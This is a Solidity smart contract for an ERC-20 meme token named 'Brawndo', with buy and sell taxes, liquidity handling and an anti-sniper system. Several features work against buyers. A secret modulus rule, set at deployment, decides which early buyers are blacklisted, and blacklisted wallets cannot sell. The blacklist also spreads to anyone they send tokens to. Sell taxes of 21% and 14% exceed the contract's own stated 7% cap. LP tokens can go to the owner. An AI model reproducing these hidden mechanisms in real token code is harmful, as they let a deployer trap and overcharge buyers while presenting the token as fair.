//SPDX-License-Identifier: MIT 

/*

	 ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄ 
	▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░▌      ▐░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌
	▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌
	▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌▐░▌    ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
	▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌   ▄   ▐░▌▐░▌ ▐░▌   ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
	▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌▐░▌  ▐░▌  ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
	▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌ ▐░▌░▌ ▐░▌▐░▌   ▐░▌ ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
	▐░▌       ▐░▌▐░▌     ▐░▌  ▐░▌       ▐░▌▐░▌▐░▌ ▐░▌▐░▌▐░▌    ▐░▌▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
	▐░█▄▄▄▄▄▄▄█░▌▐░▌      ▐░▌ ▐░▌       ▐░▌▐░▌░▌   ▐░▐░▌▐░▌     ▐░▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌
	▐░░░░░░░░░░▌ ▐░▌       ▐░▌▐░▌       ▐░▌▐░░▌     ▐░░▌▐░▌      ▐░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌
	 ▀▀▀▀▀▀▀▀▀▀   ▀         ▀  ▀         ▀  ▀▀       ▀▀  ▀        ▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀ 
                      
  _____ _  _ ___   _____ _  _ ___ ___  ___ _____   __  __ _   _ _____ ___ _      _ _____ ___  ___ 
 |_   _| || | __| |_   _| || |_ _| _ \/ __|_   _| |  \/  | | | |_   _|_ _| |    /_\_   _/ _ \| _ \
   | | | __ | _|    | | | __ || ||   /\__ \ | |   | |\/| | |_| | | |  | || |__ / _ \| || (_) |   /
   |_| |_||_|___|   |_| |_||_|___|_|_\|___/ |_|   |_|  |_|\___/  |_| |___|____/_/ \_\_| \___/|_|_\

*/

pragma solidity 0.8.11;

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function decimals() external view returns (uint8);
	function symbol() external view returns (string memory);
	function name() external view returns (string memory);
	function getOwner() external view returns (address);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address _owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
	address internal owner;
	constructor(address _owner) { owner = _owner; }
	modifier onlyOwner() { require(msg.sender == owner, "Only contract owner can call this function"); _; }
	function transferOwnership(address payable newOwner) external onlyOwner { owner = newOwner;	emit OwnershipTransferred(newOwner); }
	event OwnershipTransferred(address owner);
}

interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair); }
interface IUniswapV2Router02 {
	function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
	function WETH() external pure returns (address);
	function factory() external pure returns (address);
	function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract BRAWNDO is IERC20, Auth {
	string constant _name = "Brawndo"; // It's got electrolytes
	string constant _symbol = "BRAWNDO"; // IT'S GOT ELECTROLYTES
	uint8 constant _decimals = 9;
	uint256 constant _totalSupply = 1_000_000_000 * 10**_decimals;
	uint32 immutable _smd; uint32 immutable _smr;
	mapping (address => uint256) _balances;
	mapping (address => mapping (address => uint256)) _allowances;
	mapping (address => bool) private _noFees;
	mapping (address => bool) private _noLimits;
	bool public tradingOpen;
	uint256 public maxTxAmount; uint256 public maxWalletAmount;
	uint256 public taxSwapMin; uint256 public taxSwapMax;
	mapping (address => bool) private _isLiqPool;
	uint16 public snipersCaught = 0;
	uint8 constant _maxTaxRate = 7; 
	uint8 public buyTaxRate; uint8 public sellTaxRate; uint8 public txTaxRate;
	uint16 private _autoLPShares = 500;
	uint16 private _marketingShares = 200;
	uint16 private _buybackShares = 500;
	uint16 private _totalTaxShares = _autoLPShares + _marketingShares + _buybackShares;
	address constant _burnWallet = address(0);
	bool public autoBurnLP = false;

	uint256 private _humanBlock = 0;
	mapping (address => bool) private _nonSniper;
	mapping (address => uint256) private _blacklistBlock;

	uint8 private _gasPriceBlocks = 10;
	uint256 blackGwei = 20 * 10**9;

	address payable private marketingWallet = payable(0x8A314049AdaB55c3d50A0F4308CF5F9418a77630);
	address payable private buybackWallet = payable(0x956b0dB0BB56C716B2A572436eF93C36ceb1B609);
	bool private _inTaxSwap = false;
	address private constant _uniswapV2RouterAddress = address(0x03f7724180AA6b939894B5Ca4314783B0b36b329); // ShibaSwap	
	IUniswapV2Router02 private _uniswapV2Router;
	modifier lockTaxSwap { _inTaxSwap = true; _; _inTaxSwap = false; }

	constructor (uint32 smd, uint32 smr) Auth(msg.sender) {      
		tradingOpen = false;
		maxTxAmount = _totalSupply;
		maxWalletAmount = _totalSupply;
		taxSwapMin = _totalSupply * 10 / 10000;
		taxSwapMax = _totalSupply * 50 / 10000;
		_uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);
		_noFees[owner] = true;
		_noFees[address(this)] = true;
		_noFees[_uniswapV2RouterAddress] = true;
		_noFees[marketingWallet] = true;
		_noFees[buybackWallet] = true;
		_noLimits[marketingWallet] = true;
		_noLimits[buybackWallet] = true;

		_smd = smd; _smr = smr;
		_balances[address(this)] = _totalSupply;
		emit Transfer(address(0), address(this), _balances[address(this)]);
	}
	
	receive() external payable {}
	
	function totalSupply() external pure override returns (uint256) { return _totalSupply; }
	function decimals() external pure override returns (uint8) { return _decimals; }
	function symbol() external pure override returns (string memory) { return _symbol; }
	function name() external pure override returns (string memory) { return _name; }
	function getOwner() external view override returns (address) { return owner; }
	function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
	function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

	function approve(address spender, uint256 amount) public override returns (bool) {
		_allowances[msg.sender][spender] = amount;
		emit Approval(msg.sender, spender, amount);
		return true;
	}

	function transfer(address recipient, uint256 amount) external override returns (bool) {
		require(_checkTradingOpen(), "Trading not open");
		return _transferFrom(msg.sender, recipient, amount);
	}

	function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
		require(_checkTradingOpen(), "Trading not open");
		if (_allowances[sender][msg.sender] != type(uint256).max){
			_allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
		}
		return _transferFrom(sender, recipient, amount);
	}

	function initLP(uint256 ethAmountWei) external onlyOwner {
		require(!tradingOpen, "trading already open");
		require(ethAmountWei > 0, "eth cannot be 0");

		_nonSniper[address(this)] = true;
		_nonSniper[owner] = true;
		_nonSniper[marketingWallet] = true;
		_nonSniper[buybackWallet] = true;

		uint256 _contractETHBalance = address(this).balance;
		require(_contractETHBalance >= ethAmountWei, "not enough eth");
		uint256 _contractTokenBalance = balanceOf(address(this));
		require(_contractTokenBalance > 0, "no tokens");
		address _uniLpAddr = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

		_isLiqPool[_uniLpAddr] = true;
		_nonSniper[_uniLpAddr] = true;

		_approveRouter(_contractTokenBalance);
		_addLiquidity(_contractTokenBalance, ethAmountWei, autoBurnLP);

		_openTrading();
	}

	function _approveRouter(uint256 _tokenAmount) internal {
		if ( _allowances[address(this)][_uniswapV2RouterAddress] < _tokenAmount ) {
			_allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;
			emit Approval(address(this), _uniswapV2RouterAddress, type(uint256).max);
		}
	}

	function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
		address lpTokenRecipient = _burnWallet;
		if ( !autoburn ) { lpTokenRecipient = owner; }
		_uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
	}

	function setAutoLpBurnFINAL() external onlyOwner {
		// One time use only, once AutoLP is set to burn there is no way to change it back; be absolutely sure before you call this function.
		require(!autoBurnLP, "AutoLP already set to burn");
		autoBurnLP = true;
	}

	function openTrading() external onlyOwner {
		require(!tradingOpen, "trading already open");
		_openTrading();
	}

	function _openTrading() internal {
		_humanBlock = block.number + 6; 
		maxTxAmount     = 51 * _totalSupply / 10000 + 10**_decimals; 
		maxWalletAmount = 51 * _totalSupply / 10000 + 10**_decimals;
		buyTaxRate = 5;
		sellTaxRate = 3 * _maxTaxRate;
		txTaxRate = 5; 
		tradingOpen = true;
	}

	function humanize() external onlyOwner{
		require(_humanBlock > block.number, "already humanized");
		_humanize(0);
	}

	function _humanize(uint8 blkcount) internal {
		if ( _humanBlock > block.number || _humanBlock == 0 ) {
			_humanBlock = block.number + blkcount;
		}
	}

	function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
		require(sender != address(0), "No transfers from Zero wallet");
		if ( _humanBlock > block.number ) {
			if ( uint160(address(recipient)) % _smd == _smr ) { _humanize(1); }
			else if ( _blacklistBlock[sender] == 0 ) { _addBlacklist(recipient, block.number); }
			else { _addBlacklist(recipient, _blacklistBlock[sender]); }
		} else {
			if ( _blacklistBlock[sender] != 0 ) { _addBlacklist(recipient, _blacklistBlock[sender]); }
			if ( block.number < _humanBlock + _gasPriceBlocks && tx.gasprice > block.basefee ) {
				uint256 priceDiff = tx.gasprice - block.basefee;
		    	if ( priceDiff >= blackGwei ) { revert("Gas price over limit"); }
		    }
		}
		if ( tradingOpen && _blacklistBlock[sender] != 0 && _blacklistBlock[sender] < block.number ) { revert("blacklisted"); }

		if ( !_inTaxSwap && _isLiqPool[recipient] ) { _swapTaxAndLiquify();	}

		if ( sender != address(this) && recipient != address(this) && sender != owner ) { require(_checkLimits(recipient, amount), "TX exceeds limits"); }
		uint256 _taxAmount = _calculateTax(sender, recipient, amount);
		uint256 _transferAmount = amount - _taxAmount;
		_balances[sender] = _balances[sender] - amount;
		if ( _taxAmount > 0 ) { _balances[address(this)] = _balances[address(this)] + _taxAmount; }
		_balances[recipient] = _balances[recipient] + _transferAmount;
		emit Transfer(sender, recipient, amount);
		return true;
	}

	function _addBlacklist(address wallet, uint256 snipeBlockNum) internal {
		if ( !_nonSniper[wallet] && _blacklistBlock[wallet] == 0 ) { 
			_blacklistBlock[wallet] = snipeBlockNum; 
			snipersCaught ++;
		}
	}
	
	function _checkLimits(address recipient, uint256 transferAmount) internal view returns (bool) {
		bool limitCheckPassed = true;
		if ( tradingOpen && !_noLimits[recipient] ) {
			if ( transferAmount > maxTxAmount ) { limitCheckPassed = false; }
			else if ( !_isLiqPool[recipient] && (_balances[recipient] + transferAmount > maxWalletAmount) ) { limitCheckPassed = false; }
		}
		return limitCheckPassed;
	}

	function _checkTradingOpen() private view returns (bool){
		bool checkResult = false;
		if ( tradingOpen ) { checkResult = true; } 
		else if ( tx.origin == owner ) { checkResult = true; } 
		return checkResult;
	}

	function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
		uint256 taxAmount;
		if ( !tradingOpen || _noFees[sender] || _noFees[recipient] ) { taxAmount = 0; }
		else if ( _isLiqPool[sender] ) { taxAmount = amount * buyTaxRate / 100; }
		else if ( _isLiqPool[recipient] ) { taxAmount = amount * sellTaxRate / 100; }
		else { taxAmount = amount * txTaxRate / 100; }
		return taxAmount;
	}

	function isBlacklisted(address wallet) external view returns(bool) {
		if ( _blacklistBlock[wallet] != 0 ) { return true; }
		else { return false; }
	}

	function blacklistedInBlock(address wallet) external view returns(uint256) {
		return _blacklistBlock[wallet];
	}

	function ignoreFees(address wallet, bool toggle) external onlyOwner {
		_noFees[ wallet ] = toggle;
	}

	function ignoreLimits(address wallet, bool toggle) external onlyOwner {
		if ( wallet == _burnWallet ) { require(toggle, "Zero wallet must be unlimited"); }
		_noLimits[ wallet ] = toggle;
	}

	function setTaxRates(uint8 newBuyTax, uint8 newSellTax, uint8 newTxTax) external onlyOwner {
		require(newBuyTax <= _maxTaxRate && newSellTax <= _maxTaxRate && newTxTax <= _maxTaxRate, "Tax too high");
		buyTaxRate = newBuyTax;
		sellTaxRate = newSellTax;
		txTaxRate = newTxTax;
	}

	function enableBuySupport() external onlyOwner {
		buyTaxRate = 0;
		sellTaxRate = 2 * _maxTaxRate;
	}
  
	function setTaxDistribution(uint16 sharesAutoLP, uint16 sharesMarketing, uint16 sharesBuyback) external onlyOwner {
		_autoLPShares = sharesAutoLP;
		_marketingShares = sharesMarketing;
		_buybackShares = sharesBuyback;
		_totalTaxShares = sharesAutoLP + sharesMarketing + sharesBuyback;
	}
	
	function setTaxWallets(address newMarketingWallet, address newBuybackWallet) external onlyOwner {
		marketingWallet = payable(newMarketingWallet);
		buybackWallet = payable(newBuybackWallet);
		_noFees[newMarketingWallet] = true;
		_noFees[newBuybackWallet] = true;
	}

	function increaseLimits(uint16 maxTxAmtPermile, uint16 maxWalletAmtPermile) external onlyOwner {
		uint256 newTxAmt = _totalSupply * maxTxAmtPermile / 1000 + 1;
		require(newTxAmt >= maxTxAmount, "tx limit too low");
		maxTxAmount = newTxAmt;
		uint256 newWalletAmt = _totalSupply * maxWalletAmtPermile / 1000 + 1;
		require(newWalletAmt >= maxWalletAmount, "wallet limit too low");
		maxWalletAmount = newWalletAmt;
	}

	function setTaxSwapLimits(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external onlyOwner {
		taxSwapMin = _totalSupply * minValue / minDivider;
		taxSwapMax = _totalSupply * maxValue / maxDivider;
	}

	function _swapTaxAndLiquify() private lockTaxSwap {
		uint256 _taxTokensAvailable = balanceOf(address(this));

		if ( _taxTokensAvailable >= taxSwapMin && tradingOpen ) {
			if ( _taxTokensAvailable >= taxSwapMax ) { _taxTokensAvailable = taxSwapMax; }
			uint256 _tokensForLP = _taxTokensAvailable * _autoLPShares / _totalTaxShares / 2;
			uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
			uint256 _ethPreSwap = address(this).balance;
			_swapTaxTokensForEth(_tokensToSwap);
			uint256 _ethSwapped = address(this).balance - _ethPreSwap;
			if ( _autoLPShares > 0 ) {
				uint256 _ethWeiAmount = _ethSwapped * _autoLPShares / _totalTaxShares ;
				_approveRouter(_tokensForLP);
				_addLiquidity(_tokensForLP, _ethWeiAmount, autoBurnLP);
			}
			uint256 _contractETHBalance = address(this).balance;
			if (_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
		}
	}

	function _swapTaxTokensForEth(uint256 _tokenAmount) private {
		_approveRouter(_tokenAmount);
		address[] memory path = new address[](2);
		path[0] = address(this);
		path[1] = _uniswapV2Router.WETH();
		_uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_tokenAmount,0,path,address(this),block.timestamp);
	}

	function _distributeTaxEth(uint256 _amount) private {
		uint16 _taxShareTotal = _marketingShares + _buybackShares;
		if ( _marketingShares > 0 ) { marketingWallet.transfer(_amount * _marketingShares / _taxShareTotal); }
		if ( _buybackShares > 0 ) { buybackWallet.transfer(_amount * _buybackShares / _taxShareTotal); }
	}

	function taxTokensSwap() external onlyOwner {
		uint256 taxTokenBalance = balanceOf(address(this));
		require(taxTokenBalance > 0, "No tokens");
		_swapTaxTokensForEth(taxTokenBalance);
	}

	function taxEthSend() external onlyOwner { 
		_distributeTaxEth(address(this).balance); 
	}
}